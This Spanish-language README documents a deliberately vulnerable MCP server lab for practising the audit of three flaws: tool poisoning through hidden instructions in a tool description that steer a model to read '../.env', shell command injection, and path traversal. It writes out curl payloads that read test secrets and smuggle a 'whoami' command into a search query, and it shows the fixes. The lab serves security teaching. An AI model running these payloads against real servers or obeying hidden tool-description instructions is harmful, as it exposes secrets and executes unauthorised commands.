# vulnerable-notes-mcp

Servidor [MCP](https://modelcontextprotocol.io) deliberadamente vulnerable, para reproducir en vivo tres fallas de seguridad que aparecen en servers MCP reales:

1. **Tool poisoning** — instrucciones escondidas en la `description` de una tool, que el modelo lee y obedece sin que la persona las vea nunca. Se detecta por lectura (`tools/list`), local, contra cualquier server antes de conectarlo.
2. **Command injection** — input sin sanitizar concatenado en un `exec()` de shell.
3. **Path traversal** — un parámetro de ruta que se une al directorio permitido sin validar el resultado.

Las fallas 2 y 3 se sirven también por HTTP, para practicarlas de la misma forma en que se auditaría un MCP remoto real (Notion, Slack, o cualquier otro), con `curl` puro y sin depender de este repo salvo como objetivo de práctica.

Acompaña el post [Auditando un servidor MCP: las 3 fallas que nadie está mirando](https://rockysec.com/auditando-servidor-mcp/) en rockysec.com. Ahí está la explicación completa de cada falla, con teoría y mitigación.

**No usar como base de nada real.** El código en `src/vulnerable*.ts` existe únicamente para practicar la explotación en un entorno controlado.

## Estructura

```
src/lib/vulnerable-tools.ts   las 3 fallas, compartidas por los dos transportes
src/lib/fixed-tools.ts        las 3 correcciones, compartidas por los dos transportes
src/vulnerable.ts             entrypoint stdio (local) — Falla 1: tool poisoning
src/fixed.ts                  entrypoint stdio (local), corregido
src/vulnerable-http.ts        entrypoint HTTP (remoto) — Fallas 2 y 3: injection y traversal
src/fixed-http.ts             entrypoint HTTP (remoto), corregido
agent-demo.mjs                agente real (AI SDK + GPT-4o-mini) contra el server vulnerable
notes/                        datos de ejemplo
.env.example                  secretos de prueba: es el archivo que filtra el path traversal
```

Los dos transportes registran exactamente las mismas tools (`src/lib/`): la elección de stdio vs. HTTP no cambia el bug, cambia solo cómo se lo reproduce.

## Instalación

Requiere Node 20 o superior.

```bash
git clone https://github.com/rockysec/vulnerable-notes-mcp
cd vulnerable-notes-mcp
npm install
cp .env.example .env
```

`.env` contiene credenciales de prueba (`DATABASE_URL`, `API_KEY`) que no sirven para nada real: son el objetivo del path traversal más abajo.

## 1. Tool poisoning — local, por lectura

Esta falla no necesita llamar ninguna tool: se detecta leyendo `tools/list`, exactamente como lo haría tu propio cliente MCP cada vez que conectás un servicio nuevo. Por eso se reproduce por stdio, sin red de por medio, con el [MCP Inspector](https://github.com/modelcontextprotocol/inspector) oficial:

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/vulnerable.ts --method tools/list
```

La `description` de `search_notes` sale completa, incluida la instrucción oculta dentro de un bloque `<IMPORTANT>`. Ningún host de IA la recorta antes de mostrarla al modelo.

Confirmar el fix, contra el mismo comando pero apuntando a `src/fixed.ts`:

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/fixed.ts --method tools/list
```

La `description` corregida es simplemente honesta, sin nada que un modelo pudiera confundir con una instrucción.

### El escenario completo, con un agente real

```bash
export OPENAI_API_KEY=sk-...
npm run agent-demo
```

Conecta un modelo real al server vulnerable con `@ai-sdk/mcp` y le pide que busque una nota. El script imprime cada `tool_call` que decide hacer el modelo: si obedece la instrucción oculta, va a aparecer una llamada a `read_note` con `../.env` que nadie pidió en el prompt.

## 2 y 3. Command injection y path traversal — remoto, por HTTP

A diferencia del tool poisoning, estas dos son bugs de código del servidor: existen sin que medie ninguna intención maliciosa, y para encontrarlas hay que llamar tools con argumentos diseñados para romperlas, no solo leerlas. Se sirven por HTTP para practicar la auditoría tal como se haría contra un MCP remoto real, con `curl` puro, sin ningún cliente MCP de por medio.

Levantar el server vulnerable en `http://127.0.0.1:3939/mcp`:

```bash
npm run start:http
```

### Uso legítimo, para tener un antes

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": { "name": "search_notes", "arguments": { "query": "staging" } },
    "id": 1
  }' \
  http://127.0.0.1:3939/mcp
```

### Path traversal: leer `.env` a través de `read_note`

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": { "name": "read_note", "arguments": { "path": "../.env" } },
    "id": 2
  }' \
  http://127.0.0.1:3939/mcp
```

### Command injection: ejecutar `whoami` a través de `search_notes`

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "search_notes",
      "arguments": { "query": "nada\" ; echo INYECTADO: $(whoami) ; echo \"" }
    },
    "id": 3
  }' \
  http://127.0.0.1:3939/mcp
```

`whoami` corre además del `grep` que se esperaba: la respuesta incluye una línea `INYECTADO: <tu usuario>`.

> Este server no requiere sesión (`Mcp-Session-Id`): sirve clientes 2025-06-18 sin estado. Si el MCP remoto que estés auditando sí la exige, primero mandá un `initialize`, tomá el header `Mcp-Session-Id` de la respuesta, y repetilo en cada request siguiente. La [guía de Glama sobre testing de Streamable HTTP con curl](https://glama.ai/blog/2026-01-02-how-to-test-mcp-streamable-http-endpoints-using-c-url) cubre ese flujo completo.

### Confirmar las correcciones

Detener el server vulnerable (`Ctrl+C`) y levantar el corregido en `http://127.0.0.1:3940/mcp`:

```bash
npm run start:http:fixed
```

Los mismos dos `curl` de arriba, contra el puerto `3940`, deberían responder:

```bash
# Traversal: bloqueado, isError true, "Ruta fuera de notes/"
curl -s -X POST -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_note","arguments":{"path":"../.env"}},"id":2}' \
  http://127.0.0.1:3940/mcp

# Injection: inerte, "Sin resultados", sin ejecutar whoami
curl -s -X POST -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"search_notes","arguments":{"query":"nada\" ; echo INYECTADO: $(whoami) ; echo \""}},"id":3}' \
  http://127.0.0.1:3940/mcp
```

## De este laboratorio a un MCP remoto real

Auditar un MCP de un tercero (Notion, Slack, o cualquier otro) sigue exactamente esta misma metodología, cambiando solo el destino:

- **Tool poisoning**: leer `tools/list` es siempre legítimo, es lo mismo que hace tu propio cliente al conectar el servicio. Auditar la `description` de cada tool antes de darle acceso a un agente es tu derecho como usuario.
- **Command injection y path traversal**: mandar payloads de ataque contra la infraestructura de producción de un tercero **no** es lo mismo que probarlos contra tu propio lab. Solo corresponde hacerlo si el proveedor tiene un programa de bug bounty o disclosure que explícitamente incluya su endpoint MCP en el scope, y dentro de esas reglas.

## Licencia

MIT.
